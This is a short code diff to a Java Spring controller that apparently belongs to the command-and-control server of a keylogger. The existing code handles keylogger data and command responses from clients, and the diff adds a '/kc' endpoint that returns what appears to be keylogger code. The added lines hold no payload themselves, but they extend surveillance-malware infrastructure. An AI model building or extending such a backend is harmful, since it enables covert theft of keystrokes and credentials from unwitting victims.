@@ -2,6 +2,7 @@ package com.klg.client.controller;
 
 import com.klg.client.model.CommandResponseRequest;
 import com.klg.client.model.KeyloggerData;
+import com.klg.client.model.KlgCodeResponse;
 import com.klg.client.model.SettingsResponse;
 import com.klg.client.model.SyncedCommandResponse;
 import com.klg.client.service.ClientService;
@@ -37,5 +38,10 @@ public class ClientController {
   @PostMapping("/cmd_res")
   public void saveCommandResponse(@RequestBody CommandResponseRequest request) {
     clientService.saveResponse(request);
+  }
+
+  @GetMapping("/kc")
+  public KlgCodeResponse klgCodeResponse() {
+    return clientService.klgCode();
   }
 }
